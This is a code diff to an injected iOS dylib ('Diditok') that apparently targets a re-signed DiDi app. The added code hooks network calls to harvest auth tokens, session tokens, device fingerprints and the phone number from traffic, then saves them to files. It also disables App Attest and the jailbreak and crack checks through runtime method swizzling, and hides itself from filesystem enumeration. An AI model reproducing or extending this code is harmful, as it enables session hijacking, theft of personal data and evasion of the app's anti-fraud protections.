@@ -63,7 +63,7 @@ static NSMutableArray *g_harEntries;
 static NSLock     *g_harLock;
 static int        g_harSeq = 0;
 
-static NSRegularExpression *g_reAu, *g_reSs, *g_reDev;
+static NSRegularExpression *g_reAu;
 
 static UIWindow   *g_floatWindow = nil;
 static UIButton   *g_floatButton = nil;
@@ -154,7 +154,7 @@ static NSString *aesEncryptString(NSString *plaintext) {
 // ═══════════════════════════════════════════════════════════════════════
 static NSString *buildPlainJSON(void) {
     NSMutableDictionary *d = [NSMutableDictionary new];
-    d[@"Phone"]   = g_lastPhone   ?: @"";
+    d[@"Phone"]   = g_lastPhone.length ? [@"苹果端" stringByAppendingString:g_lastPhone] : @"";
     d[@"token"]   = g_lastToken   ?: @"";
     d[@"auToken"] = g_lastAuToken ?: @"";
     d[@"ddfp"]    = g_lastDdfp    ?: (g_lastDeviceId ?: @"");
@@ -353,6 +353,81 @@ static NSString* matchHeader(NSRegularExpression *re, NSString *s) {
     return nil;
 }
 
+// header 名大小写不敏感取值（allHTTPHeaderFields 的键大小写不保证）
+static NSString *headerValue(NSDictionary *hdrs, NSString *name) {
+    NSString *v = hdrs[name];
+    if (v.length) return v;
+    for (NSString *k in hdrs) {
+        if ([k caseInsensitiveCompare:name] == NSOrderedSame) return hdrs[k];
+    }
+    return nil;
+}
+
+// 从 URL query 取字段（ddfp / device_id / token / tkn 都在这里）
+static NSString *urlQueryValue(NSURLRequest *req, NSString *name) {
+    NSString *q = req.URL.query;
+    if (!q.length) return nil;
+    for (NSString *pair in [q componentsSeparatedByString:@"&"]) {
+        NSRange eq = [pair rangeOfString:@"="];
+        if (eq.location == NSNotFound) continue;
+        if (![[pair substringToIndex:eq.location] isEqualToString:name]) continue;
+        NSString *v = [pair substringFromIndex:eq.location + 1];
+        return [v stringByRemovingPercentEncoding] ?: v;
+    }
+    return nil;
+}
+
+// 递归在 JSON 里按 key 找字符串值
+static id DidiJSONFind(id obj, NSArray *keys, int depth) {
+    if (depth > 8 || !obj) return nil;
+    if ([obj isKindOfClass:[NSDictionary class]]) {
+        for (NSString *k in keys) {
+            id v = ((NSDictionary *)obj)[k];
+            if ([v isKindOfClass:[NSString class]] && [(NSString *)v length]) return v;
+        }
+        for (id v in [(NSDictionary *)obj allValues]) {
+            id r = DidiJSONFind(v, keys, depth + 1);
+            if (r) return r;
+        }
+    } else if ([obj isKindOfClass:[NSArray class]]) {
+        for (id v in (NSArray *)obj) {
+            id r = DidiJSONFind(v, keys, depth + 1);
+            if (r) return r;
+        }
+    }
+    return nil;
+}
+
+static id bodyJSONValue(NSData *body, NSArray *keys) {
+    if (!body.length || body.length > 512 * 1024) return nil;
+    id obj = [NSJSONSerialization JSONObjectWithData:body options:0 error:nil];
+    if (!obj) return nil;
+    return DidiJSONFind(obj, keys, 0);
+}
+
+// 只从响应体里补「手机号」，且仅在尚未拿到时执行（避免每次请求都解析）
+static void onCredsFound(void);   // 定义在后面，这里先声明
+static void scanResponseBodyForPhone(NSData *data) {
+    if (g_lastPhone.length || !data.length || data.length > 512 * 1024) return;
+    @autoreleasepool {
+        id obj = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+        if (!obj) return;
+        static NSRegularExpression *rePhone; static dispatch_once_t once;
+        dispatch_once(&once, ^{
+            rePhone = [NSRegularExpression regularExpressionWithPattern:@"1[3-9]\\d{9}" options:0 error:nil];
+        });
+        id v = DidiJSONFind(obj,
+                            @[@"phone", @"cell", @"phone_num", @"mobile",
+                              @"user_phone", @"passenger_phone"], 0);
+        if (![v isKindOfClass:[NSString class]]) return;
+        NSString *s = v;
+        if ([rePhone firstMatchInString:s options:0 range:NSMakeRange(0, s.length)].length != 0) {
+            g_lastPhone = s;
+            onCredsFound();
+        }
+    }
+}
+
 static void onCredsFound(void) {
     setButtonColor([UIColor colorWithRed:0.1 green:0.7 blue:0.2 alpha:0.9]);
     writeCipherOnly();
@@ -362,17 +437,41 @@ static void onCredsFound(void) {
 
 static void scanHeaders(NSURLRequest *req, NSString *src, NSURLSessionTask *task) {
     @autoreleasepool {
+        // ── 实测（HAR 207 条 + 主二进制扫描）：
+        //   auToken : 请求头 secdd-authentication（94 条请求，值稳定，120 字符 hex）
+        //   token   : 196 字符，出现在 query "token=" / body "token" / 请求头 "token" / query "tkn="
+        //   ddfp    : 64 hex，出现在 query "ddfp="（68 次），device_id= 同值
+        //   ❌ 旧代码用的 didi-header-ssuuid / didi-header-deviceid 在 App 与流量里都是 0 次
         NSDictionary *hdrs = req.allHTTPHeaderFields;
-        if (!hdrs.count) return;
-        NSString *hstr = hdrs.description;
-        NSString *au  = matchHeader(g_reAu,  hstr) ?: hdrs[@"secdd-authentication"];
-        NSString *uu  = matchHeader(g_reSs,  hstr) ?: hdrs[@"didi-header-ssuuid"];
-        NSString *did = matchHeader(g_reDev, hstr) ?: hdrs[@"didi-header-deviceid"];
+
+        NSString *au = headerValue(hdrs, @"secdd-authentication")
+                    ?: (hdrs.count ? matchHeader(g_reAu, hdrs.description) : nil);
+
+        NSString *ddfp = urlQueryValue(req, @"ddfp")
+                      ?: urlQueryValue(req, @"device_id")
+                      ?: headerValue(hdrs, @"ddfp")
+                      ?: bodyJSONValue(req.HTTPBody, @[@"ddfp", @"device_id"]);
+
+        NSString *tok = headerValue(hdrs, @"token")
+                     ?: urlQueryValue(req, @"token")
+                     ?: urlQueryValue(req, @"tkn")
+                     ?: bodyJSONValue(req.HTTPBody, @[@"token"]);
+
+        NSString *dev = urlQueryValue(req, @"device_id");
+
+        // 空串/占位值不写入（token 未登录时可能是 ""，别把已拿到的覆盖掉）
+        if (au.length   < 16) au   = nil;
+        if (ddfp.length < 8)  ddfp = nil;
+        if (tok.length  < 8)  tok  = nil;
+        if (dev.length  < 8)  dev  = nil;
+
         BOOL changed = NO;
-        if (au  && ![au  isEqualToString:g_lastAuToken])   { g_lastAuToken = au;   changed = YES; }
-        if (uu  && ![uu  isEqualToString:g_lastDdfp])      { g_lastDdfp    = uu;   changed = YES; }
-        if (did && ![did isEqualToString:g_lastDeviceId])  { g_lastDeviceId= did;  changed = YES; }
-        if (changed && (g_lastAuToken || g_lastDdfp)) onCredsFound();
+        if (au   && ![au   isEqualToString:g_lastAuToken])  { g_lastAuToken  = au;   changed = YES; }
+        if (ddfp && ![ddfp isEqualToString:g_lastDdfp])     { g_lastDdfp     = ddfp; changed = YES; }
+        if (dev  && ![dev  isEqualToString:g_lastDeviceId]) { g_lastDeviceId = dev;  changed = YES; }
+        if (tok  && ![tok  isEqualToString:g_lastToken])    { g_lastToken    = tok;  changed = YES; }
+
+        if (changed && (g_lastAuToken || g_lastDdfp || g_lastToken)) onCredsFound();
         if (g_captureEnabled) captureRequest(req, task);
     }
 }
@@ -503,11 +602,21 @@ static UIViewController *topVC(void);
 // ═══════════════════════════════════════════════════════════════════════
 static id hookedDataTask1(id self, SEL _cmd, NSURLRequest *req, id handler) {
     typedef id (*o_t)(id, SEL, NSURLRequest *, id);
+    // 包一层 completionHandler，顺手拿到响应体（只有这样才能补手机号）
+    id wrapped = handler;
+    if (handler) {
+        void (^orig)(NSData *, NSURLResponse *, NSError *) =
+            (void (^)(NSData *, NSURLResponse *, NSError *))handler;
+        wrapped = ^(NSData *data, NSURLResponse *resp, NSError *err) {
+            @try { scanResponseBodyForPhone(data); } @catch (NSException *e) {}
+            orig(data, resp, err);
+        };
+    }
     id task = nil;
     if (g_origDataTask1) {
-        task = ((o_t)g_origDataTask1)(self, _cmd, req, handler);
+        task = ((o_t)g_origDataTask1)(self, _cmd, req, wrapped);
     } else {
-        task = ((o_t)[NSURLSession instanceMethodForSelector:_cmd])(self, _cmd, req, handler);
+        task = ((o_t)[NSURLSession instanceMethodForSelector:_cmd])(self, _cmd, req, wrapped);
     }
     scanHeaders(req, @"NSURLSession#dataTaskWithRequest:completionHandler:", task);
     return task;
@@ -715,6 +824,108 @@ static void DidiHideSelf(void) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
+// 反检测（「非官方或低版本」）
+// 实测依据：
+//   · SecCodeCheckValidity / SecStaticCodeCheckValidity / SecCodeCopySigningInformation
+//     在整个 IPA 里 0 处引用 → 不是本地验签
+//   · 主二进制有 WSGAppAttestManager / WSGDeviceCheckManager / isAppAttestEnabled /
+//     isAppAttestEntitlementPresent / isAppCracked / isJailbroken、DeviceCheck 的
+//     attestKey:clientDataHash:completionHandler: → 重签后 App Attest 必然失败
+//   · 提示文案不在包内（服务端下发）→ 只能削弱客户端上报的完整性信号
+// ═══════════════════════════════════════════════════════════════════════
+static BOOL DidiReturnNO(id self, SEL _cmd) { return NO; }
+
+// 把「是否破解/越狱/可证明」这类布尔方法统一改成 NO（只认 BOOL 返回，避免误伤）
+static void DidiSuppressIntegrityFlags(void) {
+    static const char *names[] = {
+        "isAppAttestEnabled", "isAppAttestEntitlementPresent",
+        "isAppCracked", "isCracked", "isJailbroken", "isJailBreak", "isJailBroken",
+        "isDeviceJailbroken", "isDeviceCracked", "hasCydia", "isPiracy"
+    };
+    int n = (int)(sizeof(names) / sizeof(names[0]));
+    int total = objc_getClassList(NULL, 0);
+    if (total <= 0) return;
+    Class *classes = (Class *)malloc(sizeof(Class) * (size_t)total);
+    if (!classes) return;
+    total = objc_getClassList(classes, total);
+    int hooked = 0;
+    for (int i = 0; i < total; i++) {
+        Class c = classes[i];
+        for (int j = 0; j < n; j++) {
+            SEL s = sel_registerName(names[j]);
+            Method m = class_getInstanceMethod(c, s);
+            if (m) {
+                const char *t = method_getTypeEncoding(m);
+                if (t && t[0] == 'c') {                 // 'c' = BOOL / char
+                    method_setImplementation(m, (IMP)DidiReturnNO);
+                    hooked++;
+                }
+            }
+            Method cm = class_getClassMethod(c, s);
+            if (cm) {
+                const char *t = method_getTypeEncoding(cm);
+                if (t && t[0] == 'c') {
+                    method_setImplementation(cm, (IMP)DidiReturnNO);
+                    hooked++;
+                }
+            }
+        }
+    }
+    free(classes);
+    NSLog(@"[Diditok] ✓ 完整性开关已压平 %d 处", hooked);
+}
+
+// DCAppAttestService 在重签包里一定不可用，直接让它自报不支持（SDK 会走降级路径）
+static void DidiDisableAppAttest(void) {
+    Class att = NSClassFromString(@"DCAppAttestService");
+    if (!att) { NSLog(@"[Diditok] ⚠️ DCAppAttestService 不存在"); return; }
+    Method m = class_getInstanceMethod(att, @selector(isSupported));
+    if (m) {
+        method_setImplementation(m, (IMP)DidiReturnNO);
+        NSLog(@"[Diditok] ✓ DCAppAttestService.isSupported → NO");
+    }
+}
+
+// 让本 dylib 在文件系统枚举里「不存在」（in-memory 隐藏之前做过，对磁盘扫描无效）
+static IMP g_origContentsOfDir = NULL;
+static IMP g_origFileExists     = NULL;
+
+static BOOL DidiIsOurName(NSString *s) {
+    if (!s.length) return NO;
+    NSString *low = s.lowercaseString;
+    return [low containsString:@"diditok"];
+}
+// 只隐藏「App 包内」的痕迹；Documents 里的 diditok.txt / diditok_full.har 必须照常可见（分享要用）
+static BOOL DidiInAppBundle(NSString *path) {
+    return path.length && [path.lowercaseString containsString:@".app"];
+}
+static NSArray *hookedContentsOfDir(id self, SEL _cmd, NSString *path, NSError **err) {
+    typedef NSArray *(*o_t)(id, SEL, NSString *, NSError **);
+    NSArray *arr = ((o_t)g_origContentsOfDir)(self, _cmd, path, err);
+    if (!arr.count || !DidiInAppBundle(path)) return arr;
+    NSMutableArray *out = [NSMutableArray arrayWithCapacity:arr.count];
+    for (id x in arr) {
+        if ([x isKindOfClass:[NSString class]] && DidiIsOurName(x)) continue;
+        [out addObject:x];
+    }
+    return out.count == arr.count ? arr : out;
+}
+static BOOL hookedFileExists(id self, SEL _cmd, NSString *path) {
+    typedef BOOL (*o_t)(id, SEL, NSString *);
+    if (DidiInAppBundle(path) && DidiIsOurName(path)) return NO;
+    return ((o_t)g_origFileExists)(self, _cmd, path);
+}
+static void DidiHideDylibFromFS(void) {
+    Class fm = NSClassFromString(@"NSFileManager");
+    if (!fm) return;
+    DidiHook(fm, NSSelectorFromString(@"contentsOfDirectoryAtPath:error:"),
+             (IMP)hookedContentsOfDir, &g_origContentsOfDir);
+    DidiHook(fm, NSSelectorFromString(@"fileExistsAtPath:"),
+             (IMP)hookedFileExists, &g_origFileExists);
+    NSLog(@"[Diditok] ✓ 文件系统枚举已过滤 Diditok");
+}
+
+// ═══════════════════════════════════════════════════════════════════════
 // constructor
 // ═══════════════════════════════════════════════════════════════════════
 __attribute__((constructor))
@@ -723,12 +934,13 @@ static void diditok_init(void) {
       @try {
         NSLog(@"[Diditok] ▶ constructor fired");
         DidiHideSelf();
+        DidiHideDylibFromFS();
+        DidiDisableAppAttest();
+        DidiSuppressIntegrityFlags();
 
         g_harLock    = [NSLock new];
         g_harEntries = [NSMutableArray new];
         g_reAu       = [NSRegularExpression regularExpressionWithPattern:@"secdd-authentication:\\s*(\\S+)" options:0 error:nil];
-        g_reSs       = [NSRegularExpression regularExpressionWithPattern:@"didi-header-ssuuid:\\s*(\\S+)" options:0 error:nil];
-        g_reDev      = [NSRegularExpression regularExpressionWithPattern:@"didi-header-deviceid:\\s*(\\S+)" options:0 error:nil];
 
                 // hook NSURLSession（ObjC runtime 交换，无需 Substrate）
         Class sessCls = NSClassFromString(@"NSURLSession");
